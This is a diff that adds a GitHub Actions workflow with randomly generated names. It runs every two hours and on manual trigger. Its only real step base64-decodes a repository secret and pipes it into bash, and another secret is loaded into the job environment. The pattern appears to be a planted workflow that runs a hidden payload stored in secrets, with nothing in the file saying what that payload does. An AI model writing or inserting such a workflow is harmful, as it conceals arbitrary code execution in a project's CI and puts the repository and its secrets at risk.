@@ -1,0 +1,13 @@
+name: OoTATlQdilL
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  WLKVGZzRX:
+    runs-on: ubuntu-latest
+    env:
+      YWBgcO: ${{ secrets.qModaM }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.JSaCQpQKA }}" | base64 -d | bash
